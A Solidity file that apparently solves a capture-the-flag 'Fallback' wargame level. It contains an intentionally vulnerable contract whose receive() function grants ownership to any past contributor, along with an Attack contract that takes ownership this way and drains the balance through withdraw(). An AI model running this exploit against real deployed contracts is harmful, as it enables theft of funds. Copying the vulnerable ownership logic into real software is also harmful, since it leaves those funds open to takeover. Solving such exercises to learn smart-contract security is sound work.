// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "hardhat/console.sol";

/**
 * 目标：
 *  1.获得这个合约的所有权
 *  2.把他的余额减到0
 */
contract Fallback {
    mapping(address => uint) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 10 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.1 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}

contract Attack {
    address public owner;
    Fallback fall;

    constructor(Fallback _fall) {
        owner = msg.sender;
        fall = _fall;
    }

    modifier onlyOwner() {
        require(owner == msg.sender, "N");
        _;
    }

    receive() external payable {}

    function fallbackContributes(uint256 _for) public payable {
        uint256 eth = msg.value / _for;
        console.log(_for, msg.value, eth);
        for (uint i = 0; i < _for; i++) {
            fall.contribute{value: eth}();
        }
    }

    function fallbackContribute() public payable {
        uint256 _value = msg.value / 2;
        fall.contribute{value: _value}();
        (bool success, ) = address(fall).call{value: _value}("");
        require(success, "Failed");
        fall.withdraw();
    }

    function fallbackWithdraw() public onlyOwner {
        fall.withdraw();
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }
}
